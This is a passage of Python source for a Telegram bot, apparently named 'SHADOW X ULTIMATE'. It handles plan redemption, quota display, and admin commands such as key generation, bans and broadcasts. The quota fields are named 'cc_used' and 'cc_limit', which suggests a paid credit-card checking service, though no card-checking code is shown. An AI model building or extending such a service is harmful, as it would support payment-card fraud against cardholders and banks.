                  'redeemed_at': datetime.now().isoformat()}
    save_users(u)
    codes[code]['used'] = True
    codes[code]['used_by'] = uid_str
    codes[code]['used_at'] = datetime.now().isoformat()
    save_codes(codes)
    await safe_reply(event, premium_emoji(f"✅ Redeemed {plan_key} plan! Expires: {expires.strftime('%d %b %Y')}"),
                     parse_mode='html')


# ─── /myplan ────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/myplan(?:\s|$)'))
async def myplan_cmd(event):
    uid = event.sender_id
    if uid in ADMIN_ID:
        await safe_reply(event, premium_emoji("👑 SHADOW OWNER – Unlimited"), parse_mode='html')
        return
    u = load_users()
    uid_str = str(uid)
    if uid_str not in u:
        await safe_reply(event, premium_emoji("🔴 No plan."), parse_mode='html')
        return
    data = u[uid_str]
    plan_key = data['plan']
    plan = PLANS[plan_key]
    try:
        exp = datetime.fromisoformat(data['expires_at'])
        if datetime.now() >= exp:
            await safe_reply(event, premium_emoji(f"⏰ Plan expired on {exp.strftime('%d %b %Y')}"), parse_mode='html')
            return
        days = (exp - datetime.now()).days
        await safe_reply(event,
                         premium_emoji(f"⭐ {plan_key}\nExpires: {exp.strftime('%d %b %Y')}\nDays left: {days}\nUsed: {data.get('cc_used', 0)}/{data.get('cc_limit', plan['cc_limit'])}"),
                         parse_mode='html')
    except:
        await safe_reply(event, premium_emoji("🔴 Error reading plan."), parse_mode='html')


# ─── Admin Commands ─────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/genkey(?:\s+(\w+)\s+(\d+))?$'))
async def genkey_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    m = event.pattern_match
    if not m.group(1) or not m.group(2):
        await safe_reply(event, premium_emoji("🔴 Usage: /genkey PLAN count"), parse_mode='html')
        return
    plan_key = m.group(1).upper()
    if plan_key not in PLANS:
        await safe_reply(event, premium_emoji("🔴 Invalid plan."), parse_mode='html')
        return
    count = int(m.group(2))
    if count < 1 or count > 50:
        await safe_reply(event, premium_emoji("🔴 Count 1-50."), parse_mode='html')
        return
    keys = []
    all_codes = load_codes()
    for _ in range(count):
        code = f"SHADOW-{plan_key[:3]}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
        keys.append(code)
        all_codes[code] = {'plan': plan_key, 'used': False, 'used_by': None, 'used_at': None,
                           'created_at': datetime.now().isoformat()}
    save_codes(all_codes)
    await safe_reply(event, premium_emoji(f"✅ {count} keys:\n" + "\n".join(keys)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/listusers(?:\s|$)'))
async def listusers_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    u = load_users()
    if not u:
        await safe_reply(event, premium_emoji("📦 No users."), parse_mode='html')
        return
    lines = [f"{uid} – {d.get('plan', 'FREE')} – {d.get('cc_used', 0)}/{d.get('cc_limit', 0)}" for uid, d in
             list(u.items())[-20:]]
    await safe_reply(event, premium_emoji("📊 Users:\n" + "\n".join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/stats(?:\s|$)'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    u = load_users()
    c = load_codes()
    active = sum(1 for d in u.values() if datetime.now() < datetime.fromisoformat(d.get('expires_at', '2000-01-01')))
    await safe_reply(event, premium_emoji(f"📊 Stats:\nUsers: {len(u)}\nActive: {active}\nKeys: {len(c)}"),
                     parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/setlimit(?:\s+(\d+)\s+(\d+))?$'))
async def setlimit_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    m = event.pattern_match
    if not m.group(1) or not m.group(2):
        await safe_reply(event, premium_emoji("🔴 Usage: /setlimit user_id limit"), parse_mode='html')
        return
    uid = int(m.group(1))
    limit = int(m.group(2))
    u = load_users()
    uid_str = str(uid)
    if uid_str not in u:
        await safe_reply(event, premium_emoji("🔴 User not found."), parse_mode='html')
        return
    u[uid_str]['cc_limit'] = limit
    save_users(u)
    await safe_reply(event, premium_emoji(f"✅ Set limit for {uid} to {limit}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/setplan(?:\s+(\d+)\s+(\w+))?$'))
async def setplan_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    m = event.pattern_match
    if not m.group(1) or not m.group(2):
        await safe_reply(event, premium_emoji("🔴 Usage: /setplan user_id PLAN"), parse_mode='html')
        return
    uid = int(m.group(1))
    plan_key = m.group(2).upper()
    if plan_key not in PLANS:
        await safe_reply(event, premium_emoji("🔴 Invalid plan."), parse_mode='html')
        return
    u = load_users()
    uid_str = str(uid)
    if uid_str not in u:
        await safe_reply(event, premium_emoji("🔴 User not found."), parse_mode='html')
        return
    p = PLANS[plan_key]
    u[uid_str]['plan'] = plan_key
    u[uid_str]['cc_limit'] = p['cc_limit']
    u[uid_str]['expires_at'] = (datetime.now() + timedelta(days=p['days'])).isoformat()
    save_users(u)
    await safe_reply(event, premium_emoji(f"✅ Set {uid} to {plan_key} plan."), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/ban(?:\s+(\d+)(?:\s+(.+))?)?$'))
async def ban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    m = event.pattern_match
    if not m.group(1):
        await safe_reply(event, premium_emoji("🔴 Usage: /ban user_id reason"), parse_mode='html')
        return
    uid = int(m.group(1))
    reason = m.group(2) or "Banned by admin"
    if uid in ADMIN_ID:
        await safe_reply(event, premium_emoji("🔴 Cannot ban admin."), parse_mode='html')
        return
    if ban_user(uid, reason, str(event.sender_id)):
        await safe_reply(event, premium_emoji(f"🚫 Banned {uid}.\nReason: {reason}"), parse_mode='html')
    else:
        await safe_reply(event, premium_emoji("Already banned."), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/unban(?:\s+(\d+))?$'))
async def unban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    m = event.pattern_match
    if not m.group(1):
        await safe_reply(event, premium_emoji("🔴 Usage: /unban user_id"), parse_mode='html')
        return
    uid = int(m.group(1))
    if unban_user(uid):
        await safe_reply(event, premium_emoji(f"✅ Unbanned {uid}."), parse_mode='html')
    else:
        await safe_reply(event, premium_emoji("Not banned."), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/revoke(?:\s+(\d+))?$'))
async def revoke_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    m = event.pattern_match
    if not m.group(1):
        await safe_reply(event, premium_emoji("🔴 Usage: /revoke user_id"), parse_mode='html')
        return
    uid = m.group(1)
    u = load_users()
    if uid not in u:
        await safe_reply(event, premium_emoji("🔴 User not found."), parse_mode='html')
        return
    old = u[uid].get('plan', 'FREE')
    del u[uid]
    save_users(u)
    await safe_reply(event, premium_emoji(f"✅ Revoked {uid} (was {old}). Now FREE."), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/broadcast$'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not hasattr(event, 'reply_to_msg_id') or not event.reply_to_msg_id:
        await safe_reply(event, premium_emoji("📢 Reply to a message to broadcast."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    u = load_users()
    if not u:
        await safe_reply(event, premium_emoji("🔴 No users."), parse_mode='html')
        return
    sent = 0
    failed = 0
    status = await safe_reply(event, premium_emoji(f"📢 Broadcasting to {len(u)} users..."), parse_mode='html')
    for uid in list(u.keys()):
        try:
            entity = await bot.get_entity(int(uid))
            if reply.media:
                await bot.send_file(entity, file=reply.media, caption=reply.text or "", parse_mode="html")
            else:
                await bot.send_message(entity, reply.message, parse_mode="html")
            sent += 1
            if sent % 10 == 0:
                await safe_edit(status, premium_emoji(f"📢 Progress: {sent}/{len(u)}"), parse_mode='html')
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await safe_edit(status, premium_emoji(f"✅ Broadcast done.\nSent: {sent}\nFailed: {failed}"), parse_mode='html')


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

print("🔥 SHADOW X ULTIMATE started!")
print(f"👑 Owner: @Shadow / @lessfame")
print(f"💻 Developer: @itzdem9n")
print(f"📦 Private GC: {PRIVATE_GC}")
print("🐾 Powered by Shadow")

bot.run_until_disconnected()